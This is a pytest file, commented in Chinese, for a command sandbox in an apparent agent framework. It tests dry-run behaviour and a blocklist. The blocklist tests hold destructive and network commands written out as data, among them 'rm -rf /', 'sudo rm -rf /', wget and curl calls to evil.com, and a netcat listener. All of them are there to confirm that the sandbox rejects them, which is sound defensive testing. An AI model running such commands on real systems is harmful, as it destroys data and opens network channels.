"""Phase 22 — Gate Tests: sandbox_ops (DRY_RUN + real)。

验证:
  SX01: 默认 dry_run → 模拟成功
  SX02: 空命令 → failure
  SX03: 危险命令 → rejected
  SX04: 所有黑名单命令都被拦截
  SX05: 真实模式执行成功命令（OCOS_DW_DRY_RUN=0）
  SX06: 真实模式执行失败命令
"""

import os

import pytest

from ocos.digital_world.base import DigitalOperation, OperationResult
from ocos.digital_world.sandbox import sandbox_exec, BLOCKED_COMMANDS, _DRY_RUN


# ── SX01: dry_run 默认模式 ─────────────────────────────────────

def test_sandbox_dry_run_default():
    """默认 dry_run → 返回模拟成功。"""
    op = DigitalOperation.create(
        op_type="sandbox_exec",
        target="command",
        requester="test",
        params={"command": "echo hello"},
        approval_id="APPROVED",
    )
    result = sandbox_exec(op)
    assert isinstance(result, OperationResult)
    assert result.status == "success"
    assert "simulated" in (result.output or "")


# ── SX02: 空命令 → failure ─────────────────────────────────────

def test_sandbox_empty_command():
    op = DigitalOperation.create(
        op_type="sandbox_exec",
        target="command",
        requester="test",
        params={"command": ""},
        approval_id="APPROVED",
    )
    result = sandbox_exec(op)
    assert result.status == "failure"
    assert "no command" in (result.error or "")


def test_sandbox_whitespace_only_command():
    op = DigitalOperation.create(
        op_type="sandbox_exec",
        target="command",
        requester="test",
        params={"command": "   "},
        approval_id="APPROVED",
    )
    result = sandbox_exec(op)
    assert result.status == "failure"


# ── SX03: 危险命令 → rejected ──────────────────────────────────

def test_sandbox_blocked_sudo():
    op = DigitalOperation.create(
        op_type="sandbox_exec",
        target="command",
        requester="test",
        params={"command": "sudo rm -rf /"},
        approval_id="APPROVED",
    )
    result = sandbox_exec(op)
    assert result.status == "rejected"
    assert "blocked" in (result.error or "").lower()


def test_sandbox_blocked_rm_rf():
    op = DigitalOperation.create(
        op_type="sandbox_exec",
        target="command",
        requester="test",
        params={"command": "rm -rf /tmp/test"},
        approval_id="APPROVED",
    )
    result = sandbox_exec(op)
    assert result.status == "rejected"


# ── SX04: 所有黑名单覆盖 ───────────────────────────────────────

@pytest.mark.parametrize("command", [
    "rm -rf /",
    "sudo whoami",
    "wget http://evil.com",
    "curl http://evil.com",
    "nc -l 9999",
    "telnet 127.0.0.1",
])
def test_sandbox_all_blocked_patterns(command):
    op = DigitalOperation.create(
        op_type="sandbox_exec",
        target="command",
        requester="test",
        params={"command": command},
        approval_id="APPROVED",
    )
    result = sandbox_exec(op)
    assert result.status == "rejected", f"'{command}' should be blocked"


# ── SX05: 真实模式成功命令 ─────────────────────────────────────

@pytest.mark.skipif(_DRY_RUN, reason="OCOS_DW_DRY_RUN=1, skipping real sandbox")
def test_sandbox_real_success():
    """真实模式执行简单命令。"""
    os.environ["OCOS_DW_DRY_RUN"] = "0"
    try:
        op = DigitalOperation.create(
            op_type="sandbox_exec",
            target="command",
            requester="test",
            params={"command": "echo hello_world"},
            approval_id="APPROVED",
        )
        result = sandbox_exec(op)
        assert result.status == "success"
        assert "hello_world" in (result.output or "")
    finally:
        os.environ["OCOS_DW_DRY_RUN"] = "1"


# ── SX06: 真实模式失败命令 ─────────────────────────────────────

@pytest.mark.skipif(_DRY_RUN, reason="OCOS_DW_DRY_RUN=1, skipping real sandbox")
def test_sandbox_real_failure():
    """真实模式执行失败命令 → failure。"""
    os.environ["OCOS_DW_DRY_RUN"] = "0"
    try:
        op = DigitalOperation.create(
            op_type="sandbox_exec",
            target="command",
            requester="test",
            params={"command": "cat /nonexistent_file_12345"},
            approval_id="APPROVED",
        )
        result = sandbox_exec(op)
        assert result.status == "failure"
    finally:
        os.environ["OCOS_DW_DRY_RUN"] = "1"
